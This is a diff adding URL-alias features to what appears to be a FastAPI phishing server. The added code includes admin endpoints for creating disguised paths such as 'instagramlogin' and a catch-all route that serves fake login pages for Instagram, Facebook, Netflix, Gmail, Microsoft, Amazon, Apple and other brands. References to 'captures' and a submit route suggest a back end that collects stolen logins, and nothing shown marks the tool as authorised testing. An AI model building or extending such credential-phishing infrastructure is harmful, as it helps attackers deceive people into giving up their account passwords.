@@ -3868,3 +3868,89 @@ async def clear_captures():
 async def health():
     """Health check"""
     return {"status": "ok"}
+
+
+# ── URL Aliases (custom-looking paths for phishing links) ──
+ALIAS_PATH = "/app/data/aliases.json"
+
+
+def load_aliases() -> dict:
+    if not os.path.exists(ALIAS_PATH):
+        return {}
+    try:
+        with open(ALIAS_PATH) as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+
+def save_aliases(aliases: dict) -> None:
+    with open(ALIAS_PATH, "w") as f:
+        json.dump(aliases, f, indent=2)
+
+
+@app.get("/admin/aliases", response_class=JSONResponse)
+async def get_aliases():
+    """List all custom URL aliases"""
+    return {"aliases": load_aliases()}
+
+
+@app.post("/admin/aliases")
+async def add_alias(request: Request):
+    """Add or update an alias: {'path': 'instagramlogin', 'template': 'instagram'}"""
+    data = await request.json()
+    path = data.get("path", "").strip().strip("/").lower()
+    template = data.get("template", "").strip().lower()
+
+    if not path or not template:
+        raise HTTPException(400, "Both 'path' and 'template' required")
+    if template not in TEMPLATES:
+        raise HTTPException(400, f"Unknown template. Valid: {list(TEMPLATES)}")
+    # block collisions with real routes
+    reserved = {"admin", "submit", "health", "phishing-page",
+                *TEMPLATES.keys()}
+    if path in reserved or path == "":
+        raise HTTPException(400, f"Path '{path}' is reserved")
+
+    aliases = load_aliases()
+    aliases[path] = template
+    save_aliases(aliases)
+    return {"success": True, "path": path, "template": template}
+
+
+@app.delete("/admin/aliases/{path}")
+async def del_alias(path: str):
+    aliases = load_aliases()
+    if path in aliases:
+        del aliases[path]
+        save_aliases(aliases)
+        return {"success": True}
+    raise HTTPException(404, "Alias not found")
+
+
+# CATCH-ALL — must be LAST route. Serves template based on alias.
+@app.get("/{alias:path}", response_class=HTMLResponse)
+async def alias_route(alias: str, request: Request):
+    aliases = load_aliases()
+    alias_key = alias.strip("/").lower()
+    if alias_key not in aliases:
+        raise HTTPException(404, "Not found")
+
+    template = aliases[alias_key]
+    # Re-dispatch to the matching template handler
+    handlers = {
+        "instagram": instagram_page,
+        "facebook": facebook_page,
+        "netflix": netflix_page,
+        "twitter": twitter_page,
+        "linkedin": linkedin_page,
+        "snapchat": snapchat_page,
+        "microsoft": microsoft_page,
+        "gmail": gmail_page,
+        "amazon": amazon_page,
+        "apple": apple_page,
+    }
+    handler = handlers.get(template)
+    if handler is None:
+        raise HTTPException(500, "Template handler missing")
+    return await handler()
